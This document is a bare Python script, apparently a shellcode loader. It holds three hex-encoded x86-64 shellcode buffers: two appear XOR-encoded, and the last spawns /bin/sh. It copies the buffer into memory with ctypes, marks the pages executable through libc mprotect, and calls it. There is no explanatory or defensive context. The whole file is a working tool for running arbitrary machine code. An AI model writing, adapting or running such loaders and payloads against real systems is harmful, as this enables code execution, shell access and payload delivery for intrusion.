from ctypes import *

buf = ("\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
"\xef\xff\xff\xff\x48\xbb\x59\x32\xb2\x76\x69\x01\x46"
"\x07\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
"\x33\x09\xea\xef\x21\xba\x69\x65\x30\x5c\x9d\x05\x01"
"\x01\x15\x4f\xd0\xd5\xda\x5b\x0a\x01\x46\x4f\xd0\xd4"
"\xe0\x9e\x6a\x01\x46\x07\x35\x41\xb2\x20\x3e\x49\xcf"
"\xe1\x56\x37\xb2\x76\x69\x01\x46\x07");

buf = ("\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
"\xef\xff\xff\xff\x48\xbb\xff\xc8\xca\x69\xf8\xb7\x84"
"\x83\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
"\x95\xf3\x92\xf0\xb0\x0c\xab\xe1\x96\xa6\xe5\x1a\x90"
"\xb7\xd7\xcb\x76\x2f\xa2\x44\x9b\xb7\x84\xcb\x76\x2e"
"\x98\x81\xf0\xb7\x84\x83\xd0\xaa\xa3\x07\xd7\xc4\xec"
"\x83\xa9\x9f\x82\xe0\x1e\xb8\x81\x83");

buf = '\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05';

mem_with_shell = create_string_buffer(buf, len(buf))
shell = cast(mem_with_shell, CFUNCTYPE(c_void_p))

addr = cast(mem_with_shell, c_void_p).value
libc = CDLL('libc.so.6')
pagesize = libc.getpagesize()
addr_page = (addr // pagesize) * pagesize
for page_start in range(addr_page, addr + len(buf), pagesize):
    assert libc.mprotect(page_start, pagesize, 0x7) == 0
shell()
